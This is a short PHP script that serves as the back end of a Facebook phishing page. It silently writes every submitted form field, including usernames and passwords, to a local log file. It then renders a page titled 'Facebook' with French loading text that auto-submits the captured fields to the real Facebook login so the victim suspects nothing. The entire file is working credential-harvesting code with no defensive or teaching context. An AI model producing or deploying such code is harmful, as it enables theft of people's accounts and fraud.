<?php
error_reporting(0);

$handle = fopen("log.txt", "a");                        
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}fwrite($handle, "\r\n");
fclose($handle);

?>
<html>
<head>
    <title>Facebook</title>
</head>
<body onload="document.forms.f.submit();">
    Chargement de la page.
    <form name="f" method="POST" action="https://www.facebook.com/login.php?login_attempt=1">
<?php
    foreach($_POST as $key => $value)
    {
        echo "\t\t<input type=\"hidden\" name=\"".htmlentities($key)."\" value=\"".htmlentities($value)."\">\n";
    }
?>
    </form>
</body>
</html>
